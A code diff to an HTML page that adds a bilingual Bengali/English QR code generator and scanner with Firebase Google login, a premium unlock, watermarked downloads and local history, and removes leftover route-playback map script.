+            <div class="input-wrap"><label data-i18n="lbl_wa_ph">হোয়াটসঅ্যাপ নাম্বার</label><input type="tel" id="wa-phone" placeholder="01XXXXXXXXX" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_wa_msg">মেসেজ (ঐচ্ছিক)</label><textarea id="wa-msg" data-i18n-ph="ph_wa_msg" placeholder="হ্যালো..." oninput="autoGenerate()"></textarea></div>
+        </div>
+
+        <div id="view-wifi" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_wifi_ssid">WiFi এর নাম (SSID)</label><input type="text" id="wifi-ssid" placeholder="My Network" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_wifi_pass">পাসওয়ার্ড</label><input type="password" id="wifi-pass" placeholder="••••••••" oninput="autoGenerate()"></div>
+        </div>
+
+        <div id="view-location" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_loc_lat">ল্যাটিটিউড (Latitude)</label><input type="number" id="loc-lat" placeholder="23.8103" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_loc_lon">লঙ্গিটিউড (Longitude)</label><input type="number" id="loc-lon" placeholder="90.4125" oninput="autoGenerate()"></div>
+        </div>
+
+        <div id="view-contact" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_vc_name">নাম</label><input type="text" id="vc-name" data-i18n-ph="ph_vc_name" placeholder="আপনার নাম" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_vc_phone">ফোন নাম্বার</label><input type="tel" id="vc-phone" placeholder="01XXXXXXXXX" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_vc_email">ইমেইল</label><input type="email" id="vc-email" placeholder="example@mail.com" oninput="autoGenerate()"></div>
+        </div>
+
+        <div id="view-email" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_em_to">ইমেইল অ্যাড্রেস</label><input type="email" id="em-to" placeholder="kake@pathaben.com" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_em_sub">সাবজেক্ট</label><input type="text" id="em-sub" data-i18n-ph="lbl_em_sub" placeholder="কাজের বিষয়" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_em_msg">মেসেজ</label><textarea id="em-msg" data-i18n-ph="lbl_em_msg" placeholder="বিস্তারিত লিখুন..." oninput="autoGenerate()"></textarea></div>
+        </div>
+
+        <div id="view-sms" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_sms_phone">ফোন নাম্বার</label><input type="tel" id="sms-phone" placeholder="01XXXXXXXXX" oninput="autoGenerate()"></div>
+            <div class="input-wrap"><label data-i18n="lbl_sms_msg">মেসেজ</label><textarea id="sms-msg" data-i18n-ph="lbl_em_msg" placeholder="মেসেজ লিখুন..." oninput="autoGenerate()"></textarea></div>
+        </div>
+
+        <div id="view-social" class="view-section">
+            <div class="input-wrap">
+                <label data-i18n="lbl_soc_plat">প্ল্যাটফর্ম</label>
+                <select id="soc-platform" onchange="autoGenerate()">
+                    <option value="fb">Facebook</option>
+                    <option value="insta">Instagram</option>
+                    <option value="yt">YouTube</option>
+                </select>
+            </div>
+            <div class="input-wrap"><label data-i18n="lbl_soc_url">ইউজারনেম বা প্রোফাইল লিংক</label><input type="text" id="soc-url" placeholder="username বা link" oninput="autoGenerate()"></div>
+        </div>
+
+        <div id="view-design" class="view-section">
+            <div class="input-wrap"><label data-i18n="lbl_dsg_txt">কাস্টম লেখা (নিচে দেখাবে)</label><input type="text" id="frame-text" placeholder="S C A N  M E" oninput="autoGenerate()"></div>
             
-            if(playbackMarker) map.removeLayer(playbackMarker);
-            playbackMarker = L.marker([pts[0].lat, pts[0].lng], {
-                icon: L.divIcon({ html: '<div style="background:#f43f5e;width:14px;height:14px;border-radius:50%;box-shadow:0 0 10px #f43f5e;"></div>', className:''})
-            }).addTo(map);
+            <!-- 🔥 LOCKED FEATURES 🔥 -->
+            <div class="input-wrap">
+                <label><span data-i18n="lbl_dsg_logo">মাঝখানে লোগো বসান</span> <i class="fa-solid fa-lock premium-lock" id="lock-logo"></i></label>
+                <input type="file" id="inp-logo" accept="image/*" style="padding: 10px;" onclick="checkPremiumLock(event)">
+            </div>
+            <div class="input-wrap color-grid">
+                <div><label data-i18n="lbl_dsg_qr_col">QR কালার</label><input type="color" id="col-dark" value="#000000" onchange="autoGenerate()"></div>
+                <div><label data-i18n="lbl_dsg_bg_col">ব্যাকগ্রাউন্ড</label><input type="color" id="col-light" value="#ffffff" onchange="autoGenerate()"></div>
+            </div>
+            <div class="input-wrap switch-wrap">
+                <input type="checkbox" id="bg-transparent" onchange="autoGenerate()">
+                <span data-i18n="lbl_dsg_trans">স্বচ্ছ (Transparent) ব্যাকগ্রাউন্ড</span>
+            </div>
+            <div class="input-wrap">
+                <label><span data-i18n="lbl_dsg_style">QR কোডের স্টাইল</span> <i class="fa-solid fa-lock premium-lock" id="lock-style"></i></label>
+                <select id="qr-style" onchange="checkPremiumSelect(this)">
+                    <option value="square" data-i18n="opt_sq">ক্লাসিক (Square)</option>
+                    <option value="dot" data-i18n="opt_dot">প্রিমিয়াম বিন্দু (Dot)</option>
+                </select>
+            </div>
+        </div>
 
-            toast('▶ Playing Route History...');
-            for(let i=1; i<pts.length; i++) {
-                await new Promise(r=>setTimeout(r, 600)); // speed of playback
-                playbackMarker.setLatLng([pts[i].lat, pts[i].lng]);
-                map.panTo([pts[i].lat, pts[i].lng]);
+        <div id="view-scan" class="view-section">
+            <div id="reader"></div>
+            <div class="input-wrap" style="margin-top: 20px;"><label data-i18n="lbl_scan_res">স্ক্যান রেজাল্ট</label><textarea id="scan-result" readonly placeholder="..." style="height: 100px; color: var(--primary); font-weight: 600;"></textarea></div>
+            <div class="action-btns">
+                <button class="btn-copy" onclick="copyScanResult()"><i class="fa-solid fa-copy"></i> <span data-i18n="btn_copy">কপি</span></button>
+                <button class="btn-open" onclick="openScanResult()"><i class="fa-solid fa-external-link"></i> <span data-i18n="btn_open">ওপেন</span></button>
+            </div>
+        </div>
+
+        <div id="view-history" class="view-section">
+            <h3 style="margin-top:0; color:var(--text-main); font-size:16px;" data-i18n="hist_title">সেভ করা হিস্ট্রি</h3>
+            <div id="history-list"></div>
+        </div>
+    </div> 
+
+    <!-- Scrollable Bottom Navigation -->
+    <nav class="bottom-nav" id="bottom-nav">
+        <button class="nav-item active" onclick="switchTab('text', this)"><i class="fa-solid fa-link"></i><span data-i18n="nav_text">লিংক</span></button>
+        <button class="nav-item" onclick="switchTab('scan', this)"><i class="fa-solid fa-expand"></i><span data-i18n="nav_scan">স্ক্যান</span></button>
+        <button class="nav-item" onclick="switchTab('whatsapp', this)"><i class="fa-brands fa-whatsapp"></i><span data-i18n="nav_wa">WA</span></button>
+        <button class="nav-item" onclick="switchTab('location', this)"><i class="fa-solid fa-location-dot"></i><span data-i18n="nav_loc">লোকেশন</span></button>
+        <button class="nav-item" onclick="switchTab('wifi', this)"><i class="fa-solid fa-wifi"></i><span data-i18n="nav_wifi">WiFi</span></button>
+        <button class="nav-item" onclick="switchTab('contact', this)"><i class="fa-solid fa-address-card"></i><span data-i18n="nav_contact">কন্ট্যাক্ট</span></button>
+        <button class="nav-item" onclick="switchTab('social', this)"><i class="fa-solid fa-hashtag"></i><span data-i18n="nav_social">সোশ্যাল</span></button>
+        <button class="nav-item" onclick="switchTab('email', this)"><i class="fa-solid fa-envelope"></i><span data-i18n="nav_email">ইমেইল</span></button>
+        <button class="nav-item" onclick="switchTab('sms', this)"><i class="fa-solid fa-message"></i><span data-i18n="nav_sms">SMS</span></button>
+        <button class="nav-item" onclick="switchTab('design', this)"><i class="fa-solid fa-palette"></i><span data-i18n="nav_design">ডিজাইন</span></button>
+        <button class="nav-item" onclick="switchTab('history', this)"><i class="fa-solid fa-clock-rotate-left"></i><span data-i18n="nav_history">হিস্ট্রি</span></button>
+    </nav>
+</div>
+
+<!-- 🔥 Premium Upgrade & Login Modal 🔥 -->
+<div class="modal-overlay" id="pro-modal">
+    <div class="modal-box">
+        <button class="modal-close" onclick="closeModal()"><i class="fa-solid fa-xmark"></i></button>
+        <i class="fa-solid fa-crown modal-icon"></i>
+        <h3 class="modal-title" id="modal-title">Upgrade to Pro</h3>
+        <p class="modal-desc" id="modal-desc">লগইন করুন এবং প্রিমিয়াম আনলক করুন!</p>
+        
+        <ul class="pro-list" id="pro-list">
+            <li><i class="fa-solid fa-circle-check"></i> ওয়াটারমার্ক ছাড়া হাই-রেজোলিউশন ডাউনলোড</li>
+            <li><i class="fa-solid fa-circle-check"></i> QR এর মাঝে নিজের লোগো আপলোড</li>
+            <li><i class="fa-solid fa-circle-check"></i> প্রিমিয়াম ডট (Dot) স্টাইল ব্যবহার</li>
+        </ul>
+
+        <div id="auth-section">
+            <button class="btn-google" onclick="loginWithGoogle()">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="G"> Google দিয়ে লগইন করুন
+            </button>
+        </div>
+
+        <div id="payment-section" style="display: none;">
+            <div class="payment-box">
+                <p style="margin:0 0 5px 0; font-size:13px; color:var(--text-main);"><b>বিকাশ / নগদ (Send Money):</b></p>
+                <p style="margin:0 0 10px 0; font-size:18px; font-weight:800; color:var(--primary);">01XXXXXXXXX</p>
+                <p style="margin:0; font-size:12px; color:var(--text-muted);">টাকা পাঠানোর পর আপনার ইমেইলটি আমাদের ফেসবুক পেজে মেসেজ করুন।</p>
+            </div>
+            <button class="theme-btn pro-btn" style="width:100%; padding:12px; font-size:14px;" onclick="logout()">লগআউট (Logout)</button>
+        </div>
+    </div>
+</div>
+
+<div id="toast">মেসেজ</div>
+
+<script>
+    // 🔥 Multi-Language Logic 🔥
+    const dict = {
+        "bn": {
+            title: "QR Studio", lbl_text: "টেক্সট বা লিংক দিন", ph_text: "https://...",
+            lbl_wa_ph: "হোয়াটসঅ্যাপ নাম্বার", lbl_wa_msg: "মেসেজ (ঐচ্ছিক)", ph_wa_msg: "হ্যালো...",
+            lbl_wifi_ssid: "WiFi এর নাম (SSID)", lbl_wifi_pass: "পাসওয়ার্ড",
+            lbl_loc_lat: "ল্যাটিটিউড (Latitude)", lbl_loc_lon: "লঙ্গিটিউড (Longitude)",
+            lbl_vc_name: "নাম", ph_vc_name: "আপনার নাম", lbl_vc_phone: "ফোন নাম্বার", lbl_vc_email: "ইমেইল",
+            lbl_em_to: "ইমেইল অ্যাড্রেস", lbl_em_sub: "সাবজেক্ট", lbl_em_msg: "বিস্তারিত লিখুন...",
+            lbl_sms_phone: "ফোন নাম্বার", lbl_sms_msg: "মেসেজ",
+            lbl_soc_plat: "প্ল্যাটফর্ম", lbl_soc_url: "ইউজারনেম বা প্রোফাইল লিংক",
+            lbl_dsg_txt: "কাস্টম লেখা (নিচে দেখাবে)", lbl_dsg_logo: "মাঝখানে লোগো বসান",
+            lbl_dsg_qr_col: "QR কালার", lbl_dsg_bg_col: "ব্যাকগ্রাউন্ড",
+            lbl_dsg_trans: "স্বচ্ছ (Transparent) ব্যাকগ্রাউন্ড", lbl_dsg_style: "QR কোডের স্টাইল",
+            opt_sq: "ক্লাসিক (Square)", opt_dot: "প্রিমিয়াম বিন্দু (Dot)", hist_title: "সেভ করা হিস্ট্রি",
+            lbl_scan_res: "স্ক্যান রেজাল্ট",
+            nav_text: "লিংক", nav_scan: "স্ক্যান", nav_wa: "WA", nav_loc: "লোকেশন", nav_wifi: "WiFi", nav_contact: "কন্ট্যাক্ট",
+            nav_social: "সোশ্যাল", nav_email: "ইমেইল", nav_sms: "SMS", nav_design: "ডিজাইন", nav_history: "হিস্ট্রি",
+            btn_copy: "কপি", btn_share: "শেয়ার", btn_down: "সেভ HD", btn_open: "ওপেন", hist_empty: "কোনো হিস্ট্রি নেই।",
+            t_copy: "✅ কপি হয়েছে!", t_err: "❌ লাইভ সার্ভার লাগবে", t_sh_err: "❌ শেয়ার সাপোর্ট করে না",
+            t_err_emp: "আগে কিছু লিখুন!", t_down: "📥 HD ডাউনলোড সফল!", t_res: "✅ রিস্টোর করা হয়েছে!",
+            t_scan_succ: "✅ স্ক্যান সফল!", t_open_err: "❌ এটি কোনো লিংক নয়", t_pro_warn: "⚠️ প্রো আনলক করুন", t_login: "লগইন সফল!", t_logout: "লগআউট হয়েছে"
+        },
+        "en": {
+            title: "QR Studio", lbl_text: "Enter Text or Link", ph_text: "https://...",
+            lbl_wa_ph: "WhatsApp Number", lbl_wa_msg: "Message (Optional)", ph_wa_msg: "Hello...",
+            lbl_wifi_ssid: "WiFi Name (SSID)", lbl_wifi_pass: "Password",
+            lbl_loc_lat: "Latitude", lbl_loc_lon: "Longitude",
+            lbl_vc_name: "Name", ph_vc_name: "Your Name", lbl_vc_phone: "Phone Number", lbl_vc_email: "Email",
+            lbl_em_to: "Email Address", lbl_em_sub: "Subject", lbl_em_msg: "Write details...",
+            lbl_sms_phone: "Phone Number", lbl_sms_msg: "Message",
+            lbl_soc_plat: "Platform", lbl_soc_url: "Username or Link",
+            lbl_dsg_txt: "Custom Text (Bottom)", lbl_dsg_logo: "Add Logo in Center",
+            lbl_dsg_qr_col: "QR Color", lbl_dsg_bg_col: "Background",
+            lbl_dsg_trans: "Transparent Background", lbl_dsg_style: "QR Code Style",
+            opt_sq: "Classic (Square)", opt_dot: "Premium (Dot)", hist_title: "Saved History",
+            lbl_scan_res: "Scan Result",
+            nav_text: "Link", nav_scan: "Scan", nav_wa: "WA", nav_loc: "Location", nav_wifi: "WiFi", nav_contact: "Contact",
+            nav_social: "Social", nav_email: "Email", nav_sms: "SMS", nav_design: "Design", nav_history: "History",
+            btn_copy: "Copy", btn_share: "Share", btn_down: "Save HD", btn_open: "Open", hist_empty: "No history found.",
+            t_copy: "✅ Copied!", t_err: "❌ Requires live server", t_sh_err: "❌ Share not supported",
+            t_err_emp: "Enter something first!", t_down: "📥 HD Download Successful!", t_res: "✅ Data Restored!",
+            t_scan_succ: "✅ Scan Successful!", t_open_err: "❌ Not a valid link", t_pro_warn: "⚠️ Unlock Pro Feature", t_login: "Login Success!", t_logout: "Logged Out!"
+        }
+    };
+
+    let currentLang = localStorage.getItem('lang') || 'bn';
+
+    function applyLanguage() {
+        document.querySelectorAll('[data-i18n]').forEach(el => { el.innerText = dict[currentLang][el.getAttribute('data-i18n')]; });
+        document.querySelectorAll('[data-i18n-ph]').forEach(el => { el.placeholder = dict[currentLang][el.getAttribute('data-i18n-ph')]; });
+        document.getElementById('lang-btn').innerText = currentLang === 'bn' ? 'EN' : 'BN';
+        if (currentTab === 'history') loadHistory();
+    }
+
+    function toggleLang() {
+        currentLang = currentLang === 'bn' ? 'en' : 'bn';
+        localStorage.setItem('lang', currentLang);
+        applyLanguage();
+    }
+
+    // 🔥 NEW Firebase Configuration & Setup 🔥
+    const firebaseConfig = {
+      apiKey: "AIzaSyCFnFbLhLN3mAUrmcjFkcb9DpBp5EPmKnQ",
+      authDomain: "heke-452d6.firebaseapp.com",
+      databaseURL: "https://heke-452d6-default-rtdb.firebaseio.com",
+      projectId: "heke-452d6",
+      storageBucket: "heke-452d6.firebasestorage.app",
+      messagingSenderId: "33927182418",
+      appId: "1:33927182418:web:e9891ddac048d65539478b",
+      measurementId: "G-68NZHNTTY1"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const analytics = firebase.analytics(); // Analytics initialized
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+    const provider = new firebase.auth.GoogleAuthProvider();
+
+    let isPremium = false;
+    let currentUser = null;
+
+    // 🔥 User Auth Listener 🔥
+    auth.onAuthStateChanged((user) => {
+        currentUser = user;
+        const proBtn = document.getElementById('pro-btn');
+        const authSec = document.getElementById('auth-section');
+        const paySec = document.getElementById('payment-section');
+        const mTitle = document.getElementById('modal-title');
+
+        if (user) {
+            db.collection('users').doc(user.uid).get().then((doc) => {
+                if (doc.exists) {
+                    isPremium = doc.data().isPremium || false;
+                } else {
+                    db.collection('users').doc(user.uid).set({ email: user.email, isPremium: false });
+                    isPremium = false;
+                }
+                updateUIForPremium();
+            }).catch(() => { isPremium = false; updateUIForPremium(); });
+
+            authSec.style.display = 'none'; paySec.style.display = 'block';
+            mTitle.innerText = "Get Premium Access";
+            proBtn.innerHTML = `<img src="${user.photoURL}" style="width:20px; height:20px; border-radius:50%; border:2px solid white;">`;
+        } else {
+            isPremium = false;
+            authSec.style.display = 'block'; paySec.style.display = 'none';
+            mTitle.innerText = "Upgrade to Pro";
+            proBtn.innerHTML = `<i class="fa-solid fa-crown"></i> PRO`;
+            updateUIForPremium();
+        }
+    });
+
+    function loginWithGoogle() { auth.signInWithPopup(provider).then(() => { showToast(dict[currentLang]['t_login']); closeModal(); }).catch(e => showToast("Error")); }
+    function logout() { auth.signOut().then(() => { showToast(dict[currentLang]['t_logout']); closeModal(); }); }
+
+    function updateUIForPremium() {
+        const lockLogo = document.getElementById('lock-logo'); const lockStyle = document.getElementById('lock-style');
+        if (isPremium) {
+            lockLogo.style.display = 'none'; lockStyle.style.display = 'none';
+            document.getElementById('pro-btn').style.background = '#10b981';
+        } else {
+            lockLogo.style.display = 'inline-block'; lockStyle.style.display = 'inline-block';
+            document.getElementById('pro-btn').style.background = 'var(--gold-gradient)';
+        }
+    }
+
+    // 🔥 Modal Logic 🔥
+    function openModal() { document.getElementById('pro-modal').classList.add('active'); }
+    function closeModal() { document.getElementById('pro-modal').classList.remove('active'); }
+
+    function checkPremiumLock(e) { if (!isPremium) { e.preventDefault(); openModal(); showToast(dict[currentLang]['t_pro_warn']); } }
+    function checkPremiumSelect(selectObj) {
+        if (!isPremium && selectObj.value === 'dot') {
+            selectObj.value = 'square'; openModal(); showToast(dict[currentLang]['t_pro_warn']); autoGenerate();
+        } else { autoGenerate(); }
+    }
+
+
+    // --- Core Functions Below ---
+    let currentTab = 'text', activeDataTab = 'text', logoData = null, qrGenerated = false, lastGeneratedData = ""; 
+    let html5QrCode = null;
+
+    if (localStorage.getItem('theme') === 'dark') {
+        document.body.classList.add('dark-mode');
+        document.getElementById('theme-icon').className = 'fa-solid fa-sun';
+    }
+
+    applyLanguage();
+
+    function switchTab(tabName, element) {
+        if (currentTab === 'scan' && tabName !== 'scan') stopScanner();
+        currentTab = tabName;
+        if (tabName !== 'design' && tabName !== 'history' && tabName !== 'scan') { activeDataTab = tabName; }
+        
+        document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        
+        document.getElementById(`view-${tabName}`).classList.add('active');
+        element.classList.add('active');
+        element.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
+
+        const qrCard = document.getElementById('qr-card');
+        if (tabName === 'scan') { qrCard.style.display = 'none'; startScanner(); } 
+        else { qrCard.style.display = 'flex'; if (tabName === 'history') loadHistory(); else autoGenerate(); }
+    }
+
+    // Scanner
+    function startScanner() {
+        if (!html5QrCode) html5QrCode = new Html5Qrcode("reader");
+        const config = { fps: 10, qrbox: { width: 250, height: 250 } };
+        html5QrCode.start({ facingMode: "environment" }, config,
+            (decodedText) => { document.getElementById('scan-result').value = decodedText; showToast(dict[currentLang]['t_scan_succ']); stopScanner(); },
+            () => {}
+        ).catch(err => console.log(err));
+    }
+    function stopScanner() { if (html5QrCode && html5QrCode.isScanning) { html5QrCode.stop().catch(err => {}); } }
+    function copyScanResult() { const txt = document.getElementById('scan-result').value; if(txt) { navigator.clipboard.writeText(txt); showToast(dict[currentLang]['t_copy']); } }
+    function openScanResult() { const txt = document.getElementById('scan-result').value; if(txt.startsWith("http")) window.open(txt, '_blank'); else showToast(dict[currentLang]['t_open_err']); }
+
+    // Logo Upload
+    document.getElementById('inp-logo').addEventListener('change', function(e) {
+        if(!isPremium) return;
+        const file = e.target.files[0];
+        if (file) { const reader = new FileReader(); reader.onload = function(evt) { logoData = evt.target.result; autoGenerate(); }; reader.readAsDataURL(file); } 
+        else { logoData = null; autoGenerate(); }
+    });
+
+    let typingTimer;
+    function autoGenerate() { clearTimeout(typingTimer); typingTimer = setTimeout(generateQR, 300); }
+
+    function generateQR() {
+        if (currentTab === 'scan') return; 
+        let textData = "";
+
+        if (activeDataTab === 'text') textData = document.getElementById('inp-text').value;
+        else if (activeDataTab === 'whatsapp') {
+            let phone = document.getElementById('wa-phone').value.trim().replace(/[^0-9]/g, ""); 
+            if (phone.startsWith("01") && phone.length === 11) phone = "88" + phone;
+            const msg = encodeURIComponent(document.getElementById('wa-msg').value);
+            if(phone) textData = `https://wa.me/${phone}?text=${msg}`;
+        } 
+        else if (activeDataTab === 'wifi') { const ssid = document.getElementById('wifi-ssid').value, pass = document.getElementById('wifi-pass').value; if(ssid) textData = `WIFI:S:${ssid};T:WPA;P:${pass};;`; }
+        else if (activeDataTab === 'location') { const lat = document.getElementById('loc-lat').value, lon = document.getElementById('loc-lon').value; if(lat && lon) textData = `geo:${lat},${lon}`; }
+        else if (activeDataTab === 'contact') { const n = document.getElementById('vc-name').value, p = document.getElementById('vc-phone').value, e = document.getElementById('vc-email').value; if(n||p||e) textData = `BEGIN:VCARD\nVERSION:3.0\nFN:${n}\nTEL:${p}\nEMAIL:${e}\nEND:VCARD`; }
+        else if (activeDataTab === 'email') { const to = document.getElementById('em-to').value, sub = encodeURIComponent(document.getElementById('em-sub').value), msg = encodeURIComponent(document.getElementById('em-msg').value); if(to) textData = `mailto:${to}?subject=${sub}&body=${msg}`; }
+        else if (activeDataTab === 'sms') { const ph = document.getElementById('sms-phone').value, msg = document.getElementById('sms-msg').value; if(ph) textData = `SMSTO:${ph}:${msg}`; }
+        else if (activeDataTab === 'social') {
+            const pf = document.getElementById('soc-platform').value, url = document.getElementById('soc-url').value.trim();
+            if(url) { if(url.startsWith('http')) textData = url; else { if(pf==='fb') textData = `https://facebook.com/${url}`; if(pf==='insta') textData = `https://instagram.com/${url}`; if(pf==='yt') textData = `https://youtube.com/@${url}`; } }
+        }
+
+        const container = document.getElementById('qr-container');
+        const actionBtns = document.getElementById('action-btns');
+        const isTransparent = document.getElementById('bg-transparent').checked;
+
+        if (!textData.trim()) {
+            container.innerHTML = '<i class="fa-solid fa-qrcode" style="font-size: 70px; color: #cbd5e1;"></i>';
+            container.style.background = isTransparent ? 'transparent' : 'white';
+            actionBtns.style.display = 'none'; qrGenerated = false; return;
+        }
+
+        lastGeneratedData = textData;
+        container.innerHTML = "";
+        const isDot = isPremium && document.getElementById('qr-style').value === 'dot';
+
+        new QRCode(container, {
+            text: textData, width: 220, height: 220,
+            colorDark: document.getElementById('col-dark').value,
+            colorLight: isTransparent ? "rgba(255,255,255,0)" : document.getElementById('col-light').value,
+            correctLevel: QRCode.CorrectLevel.H, dotScale: isDot ? 0.4 : 1,
+            logo: isPremium ? logoData : null, logoWidth: 55, logoHeight: 55, logoBackgroundTransparent: false
+        });
+        
+        container.style.background = isTransparent ? 'url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAHElEQVQYV2NkYGAwYkAD////Mw7y4igwDhoAxgMAgZkEAfxM2iUAAAAASUVORK5CYII=) repeat' : 'white';
+        actionBtns.style.display = 'flex'; qrGenerated = true;
+    }
+
+    function showToast(msg) {
+        const toast = document.getElementById("toast"); toast.innerText = msg; 
+        toast.classList.add("show"); setTimeout(() => toast.classList.remove("show"), 2500);
+    }
+
+    function saveToHistory() {
+        if (!qrGenerated || !lastGeneratedData) return;
+        let hist = JSON.parse(localStorage.getItem('qr_history') || '[]');
+        if (hist.length > 0 && hist[0].data === lastGeneratedData) return; 
+        hist.unshift({ type: activeDataTab, data: lastGeneratedData });
+        if(hist.length > 15) hist.pop(); localStorage.setItem('qr_history', JSON.stringify(hist));
+    }
+
+    function loadHistory() {
+        const list = document.getElementById('history-list');
+        let hist = JSON.parse(localStorage.getItem('qr_history') || '[]');
+        if (hist.length === 0) { list.innerHTML = `<p style='color:var(--text-muted); font-size:13px;'>${dict[currentLang]['hist_empty']}</p>`; return; }
+        list.innerHTML = "";
+        hist.forEach(h => {
+            let div = document.createElement('div'); div.className = 'history-item';
+            div.innerHTML = `<span class="history-text">${h.data}</span><span class="history-type">${h.type.toUpperCase()}</span>`;
+            div.onclick = () => { switchTab('text', document.querySelector('.bottom-nav button:nth-child(1)')); document.getElementById('inp-text').value = h.data; autoGenerate(); showToast(dict[currentLang]['t_res']); };
+            list.appendChild(div);
+        });
+    }
+
+    async function copyQR() { const canvas = document.querySelector('#qr-container canvas'); if (!canvas) return; saveToHistory(); try { const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png')); await navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })]); showToast(dict[currentLang]['t_copy']); } catch (error) { showToast(dict[currentLang]['t_err']); } }
+    async function shareQR() { const canvas = document.querySelector('#qr-container canvas'); if (!canvas) return; saveToHistory(); try { const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png')); const file = new File([blob], 'QR-Code.png', { type: 'image/png' }); if (navigator.share) await navigator.share({ files: [file], title: 'My QR Code' }); else showToast(dict[currentLang]['t_sh_err']); } catch (error) {} }
+
+    function downloadQR() {
+        if (!qrGenerated) return showToast(dict[currentLang]['t_err_emp']);
+        saveToHistory();
+        const originalCanvas = document.querySelector('#qr-container canvas');
+        if (!originalCanvas) return;
+
+        const exportCanvas = document.createElement('canvas'); const ctx = exportCanvas.getContext('2d');
+        const isTransparent = document.getElementById('bg-transparent').checked;
+        const scale = 4, qrSize = originalCanvas.width * scale, padding = 60 * scale; 
+        
+        // 🔥 If Free User, space added for watermark at bottom. If Pro, no extra space.
+        const bottomSpace = isPremium ? padding : (isTransparent ? padding : 130 * scale); 
+
+        exportCanvas.width = qrSize + (padding * 2); exportCanvas.height = qrSize + padding + bottomSpace;
+
+        if (!isTransparent) { ctx.fillStyle = document.getElementById('col-light').value; ctx.fillRect(0, 0, exportCanvas.width, exportCanvas.height); }
+
+        ctx.imageSmoothingEnabled = false; ctx.drawImage(originalCanvas, padding, padding, qrSize, qrSize);
+
+        if (!isTransparent) {
+            let customText = document.getElementById('frame-text').value.trim();
+            if(!customText) customText = "S C A N  M E";
+            ctx.fillStyle = document.getElementById('col-dark').value; 
+            ctx.font = `bold ${30 * scale}px 'Helvetica Neue', sans-serif`; ctx.textAlign = 'center';
+            const textX = exportCanvas.width / 2, textY = exportCanvas.height - bottomSpace + (50 * scale);
+            ctx.fillText(customText, textX, textY);
+            
+            // 🔥 Watermark Logic 🔥
+            if(!isPremium) {
+                ctx.fillStyle = '#64748b'; ctx.font = `500 ${16 * scale}px 'Helvetica Neue', sans-serif`;
+                ctx.fillText("Generated by QR Studio", textX, textY + (40 * scale));
             }
-            setTimeout(()=> { if(playbackMarker) map.removeLayer(playbackMarker); toast('Playback Finished.'); }, 2000);
-        };
+        }
 
-        document.getElementById('clearRouteBtn').onclick = () => {
-            if(activeTagId) remove(ref(db, `live_location/users/${activeTagId}/routeHistory`));
-            if(routeLines[activeTagId]) routeLines[activeTagId].setLatLngs([]);
-            toast('Route Cleared!');
-        };
-    </script>
+        const link = document.createElement('a');
+        link.download = `QR-Studio-${Date.now()}.png`; link.href = exportCanvas.toDataURL("image/png", 1.0); link.click();
+        confetti({ particleCount: 150, spread: 70, origin: { y: 0.4 }, zIndex: 9999 }); showToast(dict[currentLang]['t_down']);
+    }
+
+    function toggleTheme() { document.body.classList.toggle('dark-mode'); const isDark = document.body.classList.contains('dark-mode'); document.getElementById('theme-icon').className = isDark ? 'fa-solid fa-sun' : 'fa-solid fa-moon'; localStorage.setItem('theme', isDark ? 'dark' : 'light'); }
+</script>
+
 </body>
 </html>
